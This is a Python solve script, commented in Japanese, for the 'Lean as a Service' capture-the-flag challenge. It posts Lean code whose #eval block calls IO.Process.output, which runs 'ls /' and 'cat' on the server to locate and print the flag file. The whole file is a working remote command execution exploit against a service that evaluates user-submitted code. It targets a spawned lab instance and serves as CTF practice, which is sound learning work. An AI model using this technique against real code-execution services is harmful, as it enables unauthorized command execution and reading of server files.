#!/usr/bin/env python3
"""Lean as a Service (Daily AlpacaHack) の解法スクリプト。

サーバーは、送った Lean コードをそのまま `lean` コマンドで処理し、
標準出力・標準エラーをそのまま返します。
Lean 4 の `#eval` は IO アクションを評価できるため、
`IO.Process.output` で外部コマンド (ls / cat) を実行してフラグを読みます。

使い方:
    pip install requests
    python3 solve.py <URL>

<URL> は問題ページで "Spawn Challenge Server" を押して起動した
インスタンスの URL です。
"""

import html
import re
import sys

import requests


def run_lean(session: requests.Session, url: str, code: str) -> str:
    """Lean コードをサーバーに送り、結果表示部分 (<pre>...</pre>) のテキストを返す。"""
    response = session.post(url, data={"source": code}, timeout=30)
    response.raise_for_status()

    match = re.search(r"<pre>(.*?)</pre>", response.text, re.DOTALL)
    if match is None:
        raise RuntimeError("サーバーの応答から結果を取り出せませんでした")

    # 結果はサーバー側で HTML エスケープされて表示されるため、元に戻してから返す
    return html.unescape(match.group(1)).strip()


def lean_eval(command: str, args: list[str]) -> str:
    """外部コマンドを実行して標準出力を表示する Lean コード (#eval) を組み立てる。"""
    args_lean = ", ".join(f'"{arg}"' for arg in args)
    return (
        "#eval do\n"
        f'  let out ← IO.Process.output {{ cmd := "{command}", args := #[{args_lean}] }}\n'
        "  IO.println out.stdout\n"
    )


def main() -> None:
    if len(sys.argv) != 2:
        print(f"usage: python3 {sys.argv[0]} <URL>")
        sys.exit(1)
    url = sys.argv[1].rstrip("/") + "/"

    session = requests.Session()

    # 手順 1: `ls /` を実行し、フラグのファイル名 (/flag-<md5hash>.txt) を特定する
    ls_result = run_lean(session, url, lean_eval("ls", ["/"]))
    match = re.search(r"flag-[0-9a-f]+\.txt", ls_result)
    if match is None:
        print("フラグのファイルが見つかりませんでした。ls / の結果:")
        print(ls_result)
        sys.exit(1)
    flag_path = "/" + match.group(0)
    print(f"フラグのファイル: {flag_path}")

    # 手順 2: 特定したファイルを `cat` で読み、そのまま表示する
    print(run_lean(session, url, lean_eval("cat", [flag_path])))


if __name__ == "__main__":
    main()
